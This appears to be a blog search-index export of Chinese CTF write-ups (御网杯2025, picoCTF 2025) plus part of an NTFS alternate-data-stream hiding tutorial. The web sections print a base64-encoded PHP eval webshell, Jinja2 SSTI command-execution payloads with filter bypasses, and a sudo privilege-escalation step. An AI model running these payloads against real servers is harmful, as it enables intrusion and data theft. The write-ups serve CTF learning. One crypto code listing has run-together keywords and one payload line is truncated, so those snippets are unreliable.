<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2025御网杯线下赛</title>
    <link href="/2025/07/15/2025%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
    <url>/2025/07/15/2025%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="御网杯20205线下半决赛"><a href="#御网杯20205线下半决赛" class="headerlink" title="御网杯20205线下半决赛"></a>御网杯20205线下半决赛</h1><h2 id="re方向"><a href="#re方向" class="headerlink" title="re方向"></a>re方向</h2><h3 id="re-c"><a href="#re-c" class="headerlink" title="re_c"></a>re_c</h3><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20250714215154464.png" alt="image-20250714215154464"></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20250714215137704.png" alt="image-20250714215137704"></p><p>FLAG:flag{HNCTFmng1}</p><h3 id="re-python"><a href="#re-python" class="headerlink" title="re_python"></a>re_python</h3><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20250714215539018.png" alt="image-20250714215539018"></p><p>得到</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20250714215708927.png" alt="image-20250714215708927"></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20250714215645961.png" alt="image-20250714215645961"></p><p>脚本</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">c</span> =<span class="hljs-meta"> [144, 163, 158, 177, 121, 39, 58, 58, 91, 111, 25, 158, 72, 53, 152, </span><br><span class="hljs-meta">     78, 171, 12, 53, 105, 45, 12, 12, 53, 12, 171, 111, 91, 53, </span><br><span class="hljs-meta">     152, 105, 45, 152, 144, 39, 171, 45, 91, 78, 45, 158, 8]</span><br><span class="hljs-attribute">flag</span>=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">42</span>):<br>    <span class="hljs-attribute">for</span> j in range (<span class="hljs-number">128</span>):<br>        <span class="hljs-attribute">if</span> j * <span class="hljs-number">33</span> % <span class="hljs-number">179</span> == c[i]:<br>            <span class="hljs-attribute">flag</span>+=chr(j)<br><span class="hljs-attribute">print</span>(flag)<br><span class="hljs-comment">#flag&#123;2889e7a3-0d6b-4cbb-b6e9-04c0f26c9dca&#125;</span><br></code></pre></td></tr></table></figure><p>再替换一下</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20250714220218010.png" alt="image-20250714220218010"></p><h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><h3 id="crypto1"><a href="#crypto1" class="headerlink" title="crypto1"></a>crypto1</h3><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-14_21-50-12.png"></p><p>放到随波逐流里面能看到<code>Rot13</code>解码之后是明显的16进制编码形式，<img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_09-48-42.png" alt="PixPin_2025-07-15_09-48-42"></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_09-48-56.png" alt="PixPin_2025-07-15_09-48-56"></p><p>经过16进制转字符后特征很明显，最后Base32-&gt;Base64-&gt;Ascii85混合解码得到flag。<img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_09-49-13.png" alt="PixPin_2025-07-15_09-49-13"></p><h3 id="Crypto-10"><a href="#Crypto-10" class="headerlink" title="Crypto_10"></a>Crypto_10</h3><p>看到题目描述<code>重排时序</code> <code>62星序</code>猜测倒序和Base62。</p><p><img src="D:\work\notebook\ontebook\CTF\题目复现\御网杯2025线下wp\assets\PixPin_2025-07-15_09-54-38.png" alt="PixPin_2025-07-15_09-54-38"></p><p>倒序：</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_09-59-44.png" alt="PixPin_2025-07-15_09-59-44"></p><p>Base62解码：</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-00-08.png" alt="PixPin_2025-07-15_10-00-08"></p><h3 id="crypto解压这个文件夹"><a href="#crypto解压这个文件夹" class="headerlink" title="crypto解压这个文件夹"></a>crypto解压这个文件夹</h3><p>打开下载的附件，有一个压缩包和一张图片。直接解压文件夹需要密码，图片也不能直接打开。</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-04-44.png" alt="PixPin_2025-07-15_10-04-44"></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-05-44.png" alt="PixPin_2025-07-15_10-05-44"></p><p>图片用010打开发现文件头是错的修改一下，得到解压密码。</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-06-22.png" alt="PixPin_2025-07-15_10-06-22"></p><p>压缩包解压得到flag.jpg直接放随波逐流里然后base64解码。</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-09-06.png" alt="PixPin_2025-07-15_10-09-06"></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-09-42.png" alt="PixPin_2025-07-15_10-09-42"></p><p>得到<code>ctf_you_passed</code>包裹flag{}就是最后的flag。</p><h3 id="crypto-encryption2"><a href="#crypto-encryption2" class="headerlink" title="crypto encryption2"></a>crypto encryption2</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from secret import init1,init2,init3,FLAG<br>import hashlib<br><span class="hljs-function"><span class="hljs-title">assert</span><span class="hljs-params">(FLAG==<span class="hljs-string">&quot;flag&#123;&quot;</span>+hashlib.sha256(init1+init2+init3)</span></span><span class="hljs-selector-class">.hexdigest</span>()+<span class="hljs-string">&quot;&#125;&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-title">classlfsr</span><span class="hljs-params">()</span></span>:<br>    <span class="hljs-built_in">def__init__</span>(self, init, <span class="hljs-selector-tag">mask</span>, length):<br>        self<span class="hljs-selector-class">.init</span> = init<br>        self<span class="hljs-selector-class">.mask</span> = <span class="hljs-selector-tag">mask</span><br>        self<span class="hljs-selector-class">.lengthmask</span> = <span class="hljs-number">2</span>**(length+<span class="hljs-number">1</span>)-<span class="hljs-number">1</span><br><br>    <span class="hljs-built_in">defnext</span>(self):<br>        nextdata = (self<span class="hljs-selector-class">.init</span> &lt;&lt; <span class="hljs-number">1</span>) &amp; self<span class="hljs-selector-class">.lengthmask</span> <br>        <span class="hljs-selector-tag">i</span> = self<span class="hljs-selector-class">.init</span> &amp; self<span class="hljs-selector-class">.mask</span> &amp; self<span class="hljs-selector-class">.lengthmask</span> <br>        output = <span class="hljs-number">0</span><br>        while <span class="hljs-selector-tag">i</span> != <span class="hljs-number">0</span>:<br>            output ^= (<span class="hljs-selector-tag">i</span> &amp; <span class="hljs-number">1</span>)<br>            <span class="hljs-selector-tag">i</span> = <span class="hljs-selector-tag">i</span> &gt;&gt; <span class="hljs-number">1</span><br>        nextdata ^= output<br>        self<span class="hljs-selector-class">.init</span> = nextdata<br>        return output<br><br><span class="hljs-function"><span class="hljs-title">defcombine</span><span class="hljs-params">(x1,x2,x3)</span></span>:<br>    return (x1*x2)^(x2*x3)^(x1*x3)<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    l1 = <span class="hljs-built_in">lfsr</span>(int<span class="hljs-selector-class">.from_bytes</span>(init1,<span class="hljs-string">&quot;big&quot;</span>),<span class="hljs-number">0</span>b100000000000000000000000010000000000000000000000,<span class="hljs-number">48</span>)<br>    l2 = <span class="hljs-built_in">lfsr</span>(int<span class="hljs-selector-class">.from_bytes</span>(init2,<span class="hljs-string">&quot;big&quot;</span>),<span class="hljs-number">0</span>b100000000000000000000000000000000010000000000000,<span class="hljs-number">48</span>)<br>    l3 = <span class="hljs-built_in">lfsr</span>(int<span class="hljs-selector-class">.from_bytes</span>(init3,<span class="hljs-string">&quot;big&quot;</span>),<span class="hljs-number">0</span>b100000100000000000000000000000000000000000000000,<span class="hljs-number">48</span>)<br><br>    <span class="hljs-built_in">withopen</span>(<span class="hljs-string">&quot;keystream&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>) as f:<br>        <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-built_in">inrange</span>(<span class="hljs-number">8192</span>):<br>            <span class="hljs-selector-tag">b</span> = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> j <span class="hljs-built_in">inrange</span>(<span class="hljs-number">8</span>):<br>                <span class="hljs-selector-tag">b</span> = (b&lt;&lt;<span class="hljs-number">1</span>)+<span class="hljs-built_in">combine</span>(l1<span class="hljs-selector-class">.next</span>(),l2<span class="hljs-selector-class">.next</span>(),l3<span class="hljs-selector-class">.next</span>())<br>            f<span class="hljs-selector-class">.write</span>(<span class="hljs-built_in">chr</span>(b)<span class="hljs-selector-class">.encode</span>())<br></code></pre></td></tr></table></figure><h2 id="misc方向"><a href="#misc方向" class="headerlink" title="misc方向"></a>misc方向</h2><h3 id="Misc1"><a href="#Misc1" class="headerlink" title="Misc1"></a>Misc1</h3><p>题目附件是一个加密的压缩包，直接爆破。</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-35-03.png" alt="PixPin_2025-07-15_10-35-03"></p><p>打开文档全选复制</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-35-37.png" alt="PixPin_2025-07-15_10-35-37"></p><p>粘贴一下就能看到flag</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-36-31.png" alt="PixPin_2025-07-15_10-36-31"></p><h3 id="Misc2-键盘流量"><a href="#Misc2-键盘流量" class="headerlink" title="Misc2 键盘流量"></a>Misc2 键盘流量</h3><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-52-05.png" alt="PixPin_2025-07-15_10-52-05"></p><h3 id="Misc3-数据包分析"><a href="#Misc3-数据包分析" class="headerlink" title="Misc3 数据包分析"></a>Misc3 数据包分析</h3><p>附件里的<code>.exe</code>是压缩包，修改后缀解压。</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_11-01-02.png" alt="PixPin_2025-07-15_11-01-02"></p><p>找到流量包全局搜索flag以及flag其他编码形式。</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_11-44-25.png" alt="PixPin_2025-07-15_11-44-25"></p><p>16进制解码</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_11-44-52.png" alt="PixPin_2025-07-15_11-44-52"></p><h3 id="Misc4工业流量分析"><a href="#Misc4工业流量分析" class="headerlink" title="Misc4工业流量分析"></a>Misc4工业流量分析</h3><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-54-46.png" alt="PixPin_2025-07-15_10-54-46"></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-15_10-59-31.png" alt="PixPin_2025-07-15_10-59-31"></p><p>按照时间排序，最先STOP的包。</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;ac6417423bb3000c&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web方向"><a href="#web方向" class="headerlink" title="web方向"></a>web方向</h2><h3 id="web-rce"><a href="#web-rce" class="headerlink" title="web rce"></a>web rce</h3><h4 id="方法一（打印编码的flag）"><a href="#方法一（打印编码的flag）" class="headerlink" title="方法一（打印编码的flag）"></a>方法一（打印编码的flag）</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">ip/?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">print</span>(base64_encode(file_get_contents(base64_decode(<span class="hljs-string">&quot;ZmxhZy5waHA=&quot;</span>))));</span><br></code></pre></td></tr></table></figure><h4 id="方法二（写入webshell）"><a href="#方法二（写入webshell）" class="headerlink" title="方法二（写入webshell）"></a>方法二（写入webshell）</h4><p>直接写入一个webshell</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">file_put_contents(</span><br><span class="language-xml">    base64_decode(&quot;c2hlbGwucGhw&quot;),  // &quot;shell.php&quot;</span><br><span class="language-xml">    base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/Pg==&quot;)  // &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(\<span class="hljs-variable">$_POST</span>[x]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br><span class="language-xml">);</span><br></code></pre></td></tr></table></figure><p>进行编码后为：</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">ip/?cmd=file_put_contents(<span class="hljs-built_in">base64_decode</span>(<span class="hljs-string">&quot;c2hlbGwucGhw&quot;</span>),<span class="hljs-built_in">base64_decode</span>(<span class="hljs-string">&quot;PD9waHAgQGV2YWwoJF9QT1NUW3hd</span><br></code></pre></td></tr></table></figure><h3 id="web-二次编码"><a href="#web-二次编码" class="headerlink" title="web 二次编码"></a>web 二次编码</h3><p>直接访问<code>/flag.php</code>就可以得到<code>flag.php</code></p><h3 id="web-sql"><a href="#web-sql" class="headerlink" title="web sql"></a>web sql</h3><p>直接用sqlmap。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>picgoCTF2025wp</title>
    <link href="/2025/07/10/picgoCTF2025wp/"/>
    <url>/2025/07/10/picgoCTF2025wp/</url>
    
    <content type="html"><![CDATA[<h1 id="picgoCTF2025"><a href="#picgoCTF2025" class="headerlink" title="picgoCTF2025"></a>picgoCTF2025</h1><h2 id="SSTI1"><a href="#SSTI1" class="headerlink" title="SSTI1"></a>SSTI1</h2><p>SSTI漏洞介绍</p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园</a></p><p>绕过payload</p><p>[PayloadsAllTheThings&#x2F;Server Side Template Injection&#x2F;Python.md at master · swisskyrepo&#x2F;PayloadsAllTheThings · GitHub](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server</a> Side Template Injection&#x2F;Python.md?ref&#x3D;blog.qz.sg#jinja2—remote-command-execution)</p><p>自动化工具tplmap</p><p>github地址：<a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_10-28-18.png" alt="PixPin_2025-07-07_10-28-18"></p><p>我们可以从headers中看到它是Python应用程序。</p><p>如果我们使用经典的<code>&#123;&#123;7*7&#125;&#125;</code> Python SSTI测试，我们将获得以下内容，这表明确实有已确认的SSTI。</p><p><img src="D:\work\temp\PixPin_2025-07-07_14-19-19.png" alt="PixPin_2025-07-07_14-19-19"></p><p>我们使用<code>&#123;&#123; config &#125;&#125;</code>测试配置对象，我们将获得以下内容。</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_10-58-28.png" alt="PixPin_2025-07-07_10-58-28"></p><p>这些设置是典型的 Flask 项目配置文件的一部分。没有直接提到具体的模板引擎，但 Flask 默认使用的是 <strong>Jinja2</strong> 作为模板引擎，除了 Flask 外，还可以配合其他模板引擎。</p><p>查看一些模板RCE方法[PayloadsAllTheThings&#x2F;Server Side Template Injection&#x2F;Python.md at master · swisskyrepo&#x2F;PayloadsAllTheThings · GitHub](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server</a> Side Template Injection&#x2F;Python.md?ref&#x3D;blog.qz.sg#jinja2—remote-command-execution)</p><p>以递归方式列出所有工作目录:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;request.application.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;ls -R&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>cat flag</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request.application.__globals__.__builtins__.__import__</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="SSTI2"><a href="#SSTI2" class="headerlink" title="SSTI2"></a>SSTI2</h2><p>与 SSTI1类似，不同之处在于存在某些字符的黑名单。我们可以简单使用模板RCE</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_16-04-27.png" alt="PixPin_2025-07-07_16-04-27"></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request</span>|attr(<span class="hljs-name">&#x27;application&#x27;</span>)|attr(<span class="hljs-name">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>)|attr(<span class="hljs-name">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="hljs-name">&#x27;\x5f\x5fbuiltins\x5f\x5f&#x27;</span>)|attr(<span class="hljs-name">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="hljs-name">&#x27;\x5f\x5fimport\x5f\x5f&#x27;</span>)(<span class="hljs-name">&#x27;os&#x27;</span>)|attr(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;grep picoCTF . -rnw&#x27;</span>)|attr(<span class="hljs-name">&#x27;read&#x27;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_16-06-59.png" alt="PixPin_2025-07-07_16-06-59"></p><h2 id="head-dump"><a href="#head-dump" class="headerlink" title="head-dump"></a>head-dump</h2><p>按照题目描述来做</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_17-56-02.png" alt="PixPin_2025-07-07_17-56-02"></p><p>找到API文档，</p><p><img src="D:\work\temp\PixPin_2025-07-07_15-48-55.png" alt="PixPin_2025-07-07_15-48-55"></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_15-49-44.png" alt="PixPin_2025-07-07_15-49-44"></p><p>找到安装程序安装，<img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_15-50-12.png" alt="PixPin_2025-07-07_15-50-12"></p><p>下载到本地打开后直接<code>ctri+F</code>搜索得到flag</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_15-53-06.png" alt="PixPin_2025-07-07_15-53-06"></p><h2 id="n0s4n1ty-1"><a href="#n0s4n1ty-1" class="headerlink" title="n0s4n1ty 1"></a>n0s4n1ty 1</h2><p>直接上传一个 <code>php  shell</code>，文件上传没有对php做任何过滤，我们得到了文件上传路径但是连不上蚁剑。 <img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_14-39-12.png" alt="PixPin_2025-07-07_14-39-12"></p><p>进入上传的路径将<code>whoami</code>作为<code>cmd</code>参数以<code>?cmd=whoami</code>发送代码执行。这意味着我们的webshell起作用了。</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_15-01-54.png" alt="PixPin_2025-07-07_15-01-54"></p><p>直接进入<code>/root</code>目录显示拒绝请求。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">ls: cannot <span class="hljs-built_in">open</span> <span class="hljs-built_in">directory</span> <span class="hljs-string">&#x27;/root&#x27;</span>: Permission denied<br></code></pre></td></tr></table></figure><p>我们尝试查看当前用户可以使用<code>sudo -l</code>运行的命令。</p><p>我们可以在不需要密码的情况下运行任何命令。直接sudo提权</p><p>我们知道该flag在<code>/root</code>中，并且可能在某些文本文件中。我们可以<code>grep</code>所有文本文件。</p><p><strong>sudo提权</strong><br>sudo命令以系统管理者的身份执行指令，也就是说，经由 sudo 所执行的指令就好像是 root 亲自执行。<br>sudo 表示 “superuser do”。 它允许已验证的用户以其他用户的身份来运行命令。其他用户可以是普通用户或者超级用户。然而，大部分时候我们用它来以提升的权限来运行命令。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo <span class="hljs-keyword">grep</span> -rnw <span class="hljs-string">&#x27;/root&#x27;</span> -e <span class="hljs-string">&#x27;.*&#x27;</span> --<span class="hljs-keyword">include</span>=*.txt<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_15-13-51.png" alt="PixPin_2025-07-07_15-13-51"></p><h2 id="3v-l"><a href="#3v-l" class="headerlink" title="3v@l"></a>3v@l</h2><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-07_16-15-35.png" alt="PixPin_2025-07-07_16-15-35"></p><h3 id="1-0x-0-9A-Fa-f"><a href="#1-0x-0-9A-Fa-f" class="headerlink" title="1. 0x[0-9A-Fa-f]+"></a>1. <code>0x[0-9A-Fa-f]+</code></h3><h4 id="✅-匹配-十六进制编码"><a href="#✅-匹配-十六进制编码" class="headerlink" title="✅ 匹配 十六进制编码"></a>✅ 匹配 <strong>十六进制编码</strong></h4><ul><li>用途：绕过敏感字符串检测，例如：<ul><li><code>0x6f</code> 是字符 <code>o</code></li><li><code>0x7368</code> 是 <code>sh</code></li></ul></li><li>可被拼接成：<code>0x6f + 0x73</code> → <code>os</code></li></ul><hr><h3 id="2-u-0-9A-Fa-f-4"><a href="#2-u-0-9A-Fa-f-4" class="headerlink" title="2. \\u[0-9A-Fa-f]{4}"></a>2. <code>\\u[0-9A-Fa-f]&#123;4&#125;</code></h3><h4 id="✅-匹配-Unicode-编码"><a href="#✅-匹配-Unicode-编码" class="headerlink" title="✅ 匹配 Unicode 编码"></a>✅ 匹配 <strong>Unicode 编码</strong></h4><ul><li>用途：绕过关键词过滤，例如：<ul><li><code>\u006f\u0073</code> ➝ <code>os</code></li><li><code>\u0073\u0068\u0065\u006c\u006c</code> ➝ <code>shell</code></li></ul></li></ul><hr><h3 id="3-0-9A-Fa-f-2"><a href="#3-0-9A-Fa-f-2" class="headerlink" title="3. %[0-9A-Fa-f]{2}"></a>3. <code>%[0-9A-Fa-f]&#123;2&#125;</code></h3><h4 id="✅-匹配-URL-编码"><a href="#✅-匹配-URL-编码" class="headerlink" title="✅ 匹配 URL 编码"></a>✅ 匹配 <strong>URL 编码</strong></h4><ul><li>用途：绕过 URL 请求中的黑名单，例如：<ul><li><code>%6f%73</code> ➝ <code>os</code></li><li><code>%2e%2e</code> ➝ <code>..</code>（目录穿越）</li></ul></li></ul><hr><h3 id="4-A-Za-z0-9-1-3-b"><a href="#4-A-Za-z0-9-1-3-b" class="headerlink" title="4. \.[A-Za-z0-9]{1,3}\b"></a>4. <code>\.[A-Za-z0-9]&#123;1,3&#125;\b</code></h3><h4 id="✅-匹配-文件扩展名或类属性"><a href="#✅-匹配-文件扩展名或类属性" class="headerlink" title="✅ 匹配 文件扩展名或类属性"></a>✅ 匹配 <strong>文件扩展名或类属性</strong></h4><ul><li>例如：<ul><li><code>.py</code>, <code>.sh</code>, <code>.exe</code>, <code>.ls</code>, <code>.os</code></li><li>或 <code>.os</code>, <code>.eval</code>, <code>.exec</code>, <code>.subprocess</code></li></ul></li><li>用于访问属性：<code>obj.__class__</code>, <code>func.__globals__</code>, 等等。</li></ul><hr><h3 id="5"><a href="#5" class="headerlink" title="5. [\\\/]"></a>5. <code>[\\\/]</code></h3><h4 id="✅-匹配-路径分隔符"><a href="#✅-匹配-路径分隔符" class="headerlink" title="✅ 匹配 路径分隔符"></a>✅ 匹配 <strong>路径分隔符</strong></h4><ul><li><code>/</code> 和 <code>\</code> 可用于文件路径访问（包括 Linux 和 Windows）<ul><li>如：<code>../../flag.txt</code>, <code>\windows\system32\cmd.exe</code></li></ul></li></ul><hr><h3 id="6"><a href="#6" class="headerlink" title="6. \.\."></a>6. <code>\.\.</code></h3><h4 id="✅-匹配-目录穿越"><a href="#✅-匹配-目录穿越" class="headerlink" title="✅ 匹配 目录穿越"></a>✅ 匹配 <strong>目录穿越</strong></h4><ul><li>明确防止访问上层目录<ul><li>如：<code>../../etc/passwd</code></li><li>或用于访问敏感文件或配置文件</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>实操</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SSTI</tag>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NTFS数据流隐写</title>
    <link href="/2025/05/20/NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E5%86%99/"/>
    <url>/2025/05/20/NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h1 id="NTFS数据流隐写"><a href="#NTFS数据流隐写" class="headerlink" title="NTFS数据流隐写"></a>NTFS数据流隐写</h1><h2 id="什么是NTFS"><a href="#什么是NTFS" class="headerlink" title="什么是NTFS"></a>什么是NTFS</h2><p>NTFS（<strong>New Technology File System</strong>）是微软开发的一种<strong>文件系统</strong>，用于在Windows操作系统中管理磁盘上的数据。它是在1993年随Windows NT 3.1首次引入的，是FAT（如FAT16、FAT32）的继任者。</p><p>NTFS交换数据流(简称<strong>ADS</strong>)是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息。————百度百科</p><p>在 NTFS 文件系统中，文件可以有 <strong>多个数据流（Data Streams）</strong>，而普通用户通常只接触到“主数据流”，也就是你双击打开时看到的内容。但事实上，NTFS 允许文件附加“备用数据流（Alternate Data Streams）”，这些流不会在资源管理器中显示，也不会影响主文件的正常使用。</p><p>这就为<strong>信息隐藏（隐写）</strong>提供了一种天然的方式。</p><p>下面我们来尝试一下NTFS交换数据流隐写。</p><h2 id="NTFS数据流隐写-1"><a href="#NTFS数据流隐写-1" class="headerlink" title="NTFS数据流隐写"></a>NTFS数据流隐写</h2><h3 id="1-单文件流隐藏"><a href="#1-单文件流隐藏" class="headerlink" title="1.单文件流隐藏"></a>1.单文件流隐藏</h3><p>首先在D盘打开cmd命令窗口,输入以下指令创建一个NTFS数据流</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">echo</span> &quot;i am a test&quot; &gt; :m0re.txt<br></code></pre></td></tr></table></figure><p>我们会发现d盘根目录下并没有名为<code>:m0ra.txt</code>的文本文档</p><p>这是因为<code>:m0ra.txt</code>是NTFS数据流，不会在资源管理器中显示，我们需要使用windows自带的notepad查看，命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">notepad :m0re.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-20_17-20-37.png" alt="PixPin_2025-05-20_17-20-37"></p><h3 id="2-关联文件流隐藏"><a href="#2-关联文件流隐藏" class="headerlink" title="2.关联文件流隐藏"></a>2.关联文件流隐藏</h3><ol><li><p>创建一个<code>test.txt</code> 写入<code>This is a normal file</code></p></li><li><p>在<code>test.txt:hidden.txt</code>（也就是关联test.txt的NTFS数据流）里写入<code>This is secret</code></p></li><li><p>用<code>type</code>读取或者直接在记事本中打开<code>test.txt</code>里面的内容都是<code>This is a 